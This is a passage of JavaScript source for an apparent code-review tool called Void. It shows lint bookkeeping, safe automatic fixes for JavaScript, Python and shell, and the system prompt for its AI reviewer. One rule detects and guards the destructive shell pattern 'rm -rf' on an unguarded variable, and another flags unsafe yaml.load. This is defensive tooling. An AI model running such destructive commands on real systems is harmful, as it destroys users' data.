      object: () => { const lo = Math.max(0, i - 12), w = rawLines.slice(lo, i + 13).join('\n'); let at = rawLines.slice(lo, i).reduce((a, l) => a + l.length + 1, 0) + (rawLines[i].indexOf('{') >= 0 ? rawLines[i].indexOf('{') + 1 : 0), d = 0, s = 0, e = w.length;
        for (let k = at - 1; k >= 0; k--) { const c = w[k]; if (c === '}') d++; else if (c === '{') { if (!d) { s = k; break; } d--; } }
        d = 0; for (let k = s + 1; k < w.length; k++) { const c = w[k]; if (c === '{') d++; else if (c === '}') { if (!d) { e = k + 1; break; } d--; } } return w.slice(s, e); },
    };
    for (const [id, kind, langs, test, message] of RULES) {
      if (!(langs.includes('*') || langs.includes(as))) continue;
      if (!test(m, r, ctx)) continue;
      const key = id + ':' + i; if (seen.has(key)) continue; seen.add(key);
      // the same style point on many lines is said once, with the count (opts.collapse === false keeps each line: the PR review
      // filters to added lines afterwards, so a first hit on an old line must not hide the new ones)
      const same = opts.collapse !== false && found.find((f) => f.rule === id && (kind === 'style' || kind === 'note'));
      if (same) { same.also = (same.also || 0) + 1; continue; }
      found.push({ line: i + 1, kind, rule: id, message, text: redact(r.trim()).slice(0, 160) });
    }
  }
  found.sort((a, b) => ORDER[a.kind] - ORDER[b.kind] || a.line - b.line);
  return { lang, findings: found.slice(0, opts.max || 25), lines: rawLines.length };
}

// Fixes Void can make by itself because they never change what correct code means. Each works on the masked line (strings and
// comments blanked, same length), so a match inside a string is never touched, and edits the raw line at the same position.
// Returns { code, changes: [{ line, rule, what }] }; code is unchanged when nothing applied.
export function autoFix(code, opts = {}) {
  const raw = String(code || '').replace(/\r\n?/g, '\n'), lang0 = opts.lang || langOf(raw), lang = lang0 === 'code' ? 'javascript' : lang0;
  const lines = raw.split('\n'), masked = mask(raw, lang).split('\n'), out = [], changes = [];
  const at = (r, m, re, fn) => { let res = '', last = 0; re.lastIndex = 0; let x; while ((x = re.exec(m))) { res += r.slice(last, x.index) + fn(r.slice(x.index, x.index + x[0].length), x); last = x.index + x[0].length; if (!x[0].length) re.lastIndex++; } return res + r.slice(last); };
  for (let i = 0; i < lines.length; i++) {
    let r = lines[i]; const m = masked[i] || '', before = r;
    const note = (rule, what) => changes.push({ line: out.length + 1, rule, what });
    if (JS.includes(lang)) {
      if (/^\s*debugger\s*;?\s*$/.test(m)) { note('debugger', 'removed the debugger line'); continue; }
      // == → ===, var → let and a parseInt radix stay warnings only: each can change what working code does
      // ("5" == 5 is true, a var used after its block, parseInt("0x10") is 16), and this version promises it doesn't
    }
    if (lang === 'python') {
      if (/[=!]=\s*None\b/.test(m)) { const b = r; r = at(r, m, /==\s*None\b|!=\s*None\b/g, (t) => t.startsWith('!') ? 'is not None' : 'is None'); if (r !== b) note('eq-none', '== None → is None'); }
      if (/^\s*except\s*:/.test(m)) { r = r.replace(/^(\s*)except\s*:/, '$1except Exception:'); note('bare-except', 'except: → except Exception: (Ctrl+C and exits are no longer swallowed)'); }
      if (/\byaml\.load\s*\(/.test(m) && !/Loader\s*=/.test(m)) { const b = r; r = at(r, m, /\byaml\.load\s*\(/g, () => 'yaml.safe_load('); if (r !== b) note('unsafe-load', 'yaml.load → yaml.safe_load'); }
      const d = m.match(/^(\s*)def\s+\w+\s*\((.*)\)\s*(?:->[^:]*)?:\s*$/);
      if (d && /=\s*(?:\[\s*\]|\{\s*\}|set\(\s*\)|list\(\s*\)|dict\(\s*\))\s*(?:,|$)/.test(d[2])) {
        const fixes = [];
        r = at(r, m, /(\w+)(\s*(?::\s*[^=,()]+)?=\s*)(\[\s*\]|\{\s*\}|set\(\s*\)|list\(\s*\)|dict\(\s*\))(?=\s*(?:,|\)))/g, (t, x) => { fixes.push([x[1], /^\[|^list/.test(x[3]) ? '[]' : /^set/.test(x[3]) ? 'set()' : '{}']); return x[1] + x[2] + 'None'; });
        if (fixes.length) {
          let ind = d[1] + '    '; for (let j = i + 1; j < lines.length; j++) if (lines[j].trim()) { ind = (lines[j].match(/^\s*/) || [''])[0]; break; }
          out.push(r); note('mutable-default', 'default [] / {} → None, created fresh inside');
          for (const [name, empty] of fixes) out.push(ind + name + ' = ' + empty + ' if ' + name + ' is None else ' + name);
          continue;
        }
      }
    }
    if (lang === 'shell' && /\brm\s+-[a-z]*r[a-z]*\s+"?\$\{?(\w+)\}?"?/i.test(r) && !/\$\{\w+:\?/.test(r)) {
      r = r.replace(/(\brm\s+-[a-z]*r[a-z]*\s+)"?\$\{?(\w+)\}?"?/i, '$1"${$2:?}"'); note('rm-rf-var', 'rm -rf $DIR → rm -rf "${DIR:?}" (stops if DIR is empty)');
    }
    out.push(r);
  }
  return { code: out.join('\n'), changes, lang: lang0 };
}

// The same findings as plain text (for the model, which confirms, drops or adds to them)
export function findingsText(res) {
  if (!res || !res.findings.length) return 'The quick checks found nothing.';
  return res.findings.map((f) => 'line ' + f.line + ' [' + f.kind + '] ' + f.message + (f.also ? ' (and ' + f.also + ' more like it)' : '')).join('\n');
}

export const REVIEW_SYSTEM = 'You are Void, doing a code review for the person who pasted this code. Be the reviewer a careful senior engineer would be: find what is actually wrong before anything cosmetic. In order: bugs (wrong results, crashes, off-by-one, unhandled cases, race conditions), security holes (injection, XSS, secrets, unsafe deserialisation, missing auth checks), data loss, then performance, then readability. For each point give the line number, what is wrong in one plain sentence, why it matters, and the fix as a short corrected code block. You are also given the results of quick pattern checks: confirm the real ones, drop any that are wrong in context, and add what they missed. Never invent problems: if the code is fine, say so plainly and stop. Do not rewrite the whole program unless asked; do not lecture; no headings beyond a short list. Plain language for someone who may be learning. Keys, tokens and passwords appear as [redacted]: never ask for them. Keep it under 450 words.';
export { redact };
